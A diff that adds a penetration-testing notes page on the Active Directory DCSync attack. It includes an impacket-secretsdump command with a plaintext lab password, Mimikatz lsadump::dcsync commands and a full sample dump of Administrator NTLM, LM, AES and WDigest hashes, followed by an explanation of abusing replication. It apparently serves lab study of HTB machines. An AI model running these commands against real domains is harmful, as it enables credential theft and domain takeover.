@@ -1,0 +1,88 @@
+### Impacket-secretsdump
+```bash
+impacket-secretsdump htb.local/mrlky:'Football#7'@10.10.10.103
+```
+Examples:
+[[Sizzle#^fa8bab]]
+### Mimikatz
+Upload the mimikatz executable to the machine first, then execute:
+```bash
+privilege::debug
+token::elevate
+lsadump::dcsync /all /csv
+```
+
+### Mimikatz Administrator
+```
+mimikatz # lsadump::dcsync /user:Administrator
+[DC] 'corp.com' will be the domain
+[DC] 'DC01.corp.com' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+\*\* SAM ACCOUNT \*\*
+
+SAM Username         : Administrator
+User Principal Name  : Administrator@corp.com
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 05/02/2018 19.33.10
+Object Security ID   : S-1-5-21-1602875587-2787523311-2599479668-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: e2b475c11da2a0748290d87aa966c327
+  ntlm- 0: e2b475c11da2a0748290d87aa966c327
+  lm  - 0: 913b84377b5cb6d210ca519826e7b5f5
+
+Supplemental Credentials:
+\* Primary:NTLM-Strong-NTOWF \*
+  Random Value : f62e88f00dff79bc79f8bad31b3ffa7d
+
+\* Primary:Kerberos-Newer-Keys \*
+  Default Salt : CORP.COMAdministrator
+  Default Iterations : 4096
+  Credentials
+  aes256_hmac (4096): 4c6300b908619dc7a0788da81ae5903c2c97c5160d0d9bed85cfd5af02dabf01
+  aes128_hmac (4096): 85b66d5482fc19858dadd07f1d9b818a
+  des_cbc_md5 (4096): 021c6df8bf07834a
+
+\* Primary:Kerberos \*
+  Default Salt : CORP.COMAdministrator
+  Credentials
+    des_cbc_md5       : 021c6df8bf07834a
+
+\* Packages \*
+  NTLM-Strong-NTOWF
+
+\* Primary:WDigest \*
+  01  4ec8821bb09675db670e66998d2161bf
+  02  3c9be2ff39c36efd2f84b63aa656d09a
+  03  2cf1734936287692601b7e36fc01e2d7
+  04  4ec8821bb09675db670e66998d2161bf
+  05  3c9be2ff39c36efd2f84b63aa656d09a
+...
+```
+Examples:
+[[Sauna#^dd4d7f]]
+Finally you can use the `Hash NTLM` to login with [[Pass The Hash]] technique
+# Explanation
+Another way to achieve persistence in an Active Directory infrastructure is to steal the password hashes for all administrative users in the domain.
+
+To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file, which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
+
+While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.
+
+In production environments, domains typically have more than one domain controller to provide redundancy. The Directory Replication Service Remote Protocol uses _replication_ to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, with the _IDL_DRSGetNCChanges API.
+
+Luckily for us, the domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user who is a member of the Domain Admins group, it will succeed.
+
+In the next example, we will log in to the Windows 10 client as jeff_admin to simulate a compromise of a domain administrator account and perform a replication.
+
+We'll open Mimikatz and start the replication using lsadump::dcsync with the /user option to indicate the target user to sync, in this case the built-in domain administrator account Administrator, as shown below.
+
+The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.
+
+Using the technique above, we can request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller.
